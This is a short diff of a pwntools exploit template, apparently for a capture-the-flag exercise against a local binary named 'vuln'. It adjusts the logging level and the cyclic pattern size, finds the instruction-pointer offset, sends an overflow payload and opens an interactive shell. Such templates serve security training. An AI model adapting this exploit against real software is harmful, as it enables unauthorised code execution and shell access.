@@ -31,20 +31,19 @@ init-pwndbg
 continue
 '''.format(**locals())
 
-
 # Binary filename
 exe = './vuln'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (warning/info/debug)
-context.log_level = 'info'
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'debug'
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
 # Pass in pattern_size, get back EIP/RIP offset
-offset = find_ip(cyclic(1000))
+offset = find_ip(cyclic(500))
 
 # Start program
 io = start()
@@ -61,7 +60,7 @@ write('payload', payload)
 
 # Send the payload
 io.sendlineafter('>', payload)
-io.recvuntil('Thank you!\n')
+io.recvuntil('Thank you!')
 
 # Got Shell?
 io.interactive()
